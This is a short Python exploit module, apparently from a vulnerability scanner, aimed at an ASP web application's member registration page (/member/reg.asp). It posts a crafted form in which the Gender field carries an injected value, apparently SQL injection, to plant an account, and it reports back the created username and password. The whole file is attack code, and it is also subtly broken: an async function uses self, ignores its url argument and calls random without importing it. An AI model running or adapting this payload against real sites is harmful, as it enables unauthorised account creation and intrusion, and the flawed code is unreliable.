#!/usr/bin/env python
# -*- coding: UTF-8 -*-

# Authors: liangzhibang@baidu.com
# Date: 2018-09-11

__author__ = "liangzhibang@baidu.com"
__date__ = '2018/9/11'


async def exploit(url: str) -> str:
    url = "http://{}/member/reg.asp?action=reg".format(self.domain)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    username = "test_{}".format(str(random.random())[-8:])
    password = "__q_w__ea_1231"
    payload = "LoginName={}&userPass={}&verifyPass={}&TrueName=%B0%AE%C7%E9&Gender=1," \
              "1,1,1,1,1,1,1)%16&Phone=02186868686&Mobile=13888888888&Email=bfcp9833%40gmail.com" \
              "&QQ=88888&Address=%D6%D0%D0%C4%D0%A1%D1%A7a&PostCode=620121&code={}&Submit=%D7%A2%B2%E1".format(
        username, password, password, self.getCode())
    try:
        res = self.s.post(url, headers=headers, data=payload, timeout=(6, 9))
    except Exception as e:
        return {"status": False, "err": "[{}] 网页或漏洞不存在".format(e)}

    if res.status_code == 200 and "/member/login.asp" in res.text:
        result = {"status": True, "username": username, "password": password}
    else:
        result = {"status": False, "err": "[{}] 网页或漏洞不存在".format(res.status_code)}

    return result
